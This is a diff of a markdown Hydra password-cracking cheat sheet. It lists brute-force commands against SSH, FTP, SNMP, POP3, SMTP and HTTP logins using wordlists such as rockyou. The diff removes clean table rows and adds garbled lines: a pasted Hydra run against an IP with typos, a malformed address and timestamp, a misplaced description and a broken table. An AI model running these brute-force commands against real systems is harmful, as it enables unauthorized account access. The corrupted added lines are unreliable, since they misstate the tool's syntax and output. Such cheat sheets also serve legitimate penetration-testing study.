@@ -1,4 +1,4 @@
-# Hydra-Cheatsheet
+$Hydra-Cheatsheet
 Hydra Password Cracking Cheetsheet
 
 The following table uses the $ip variable which can be set with the following command:  
@@ -8,11 +8,9 @@ The following table uses the $ip variable which can be set with the following co
 
 | Command | Description |
 |-------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------|
-| hydra -P password-file.txt -v $ip snmp                                                                                                    | Hydra brute force against SNMP                       |
-| hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp                                                                       | Hydra FTP known user and rockyou password list       |
-| hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh                                                                              | Hydra SSH using list of users and passwords          |
-| hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh                                                                         | Hydra SSH using a known password and a username list |
-| hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt                                                                                         | Hydra SSH Against Known username on port 22          |
+$ hydra -L users.txt-p buterfly 10.10.137.76 ssh                                                                                                 $ hydra -L users.txt-p buterfly 10.10.137.76 ssh                      |
+Hydra v9.0 (ttps://github.com/vanhauser-the/the-hydra) starting at 2024-04 15:00:00                            (DATA) max 1 task per 1 server.overall 1 task.s login tries(l:p:1).- try per task         (DATA) attacking ssh://10.137.76:22/                 (STATUS)1.00 tries/min,5 tries in 00:05h, to do in 00:05h, 1 active                                                                                [22][ssh] host:10.10.@37.76 login:molly password:buterfly 1 of 1 target sucessfully completed,l valid password found         |
+| hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh                                                                                                                                                  | Hydra SSH Against Known username on port 22          |
 | hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V                                                                          | Hydra POP3 Brute Force                               |
 | hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V                                                                                         | Hydra SMTP Brute Force                               |
 | hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin                                                                                 | Hydra attack http get 401 login with a dictionary    |
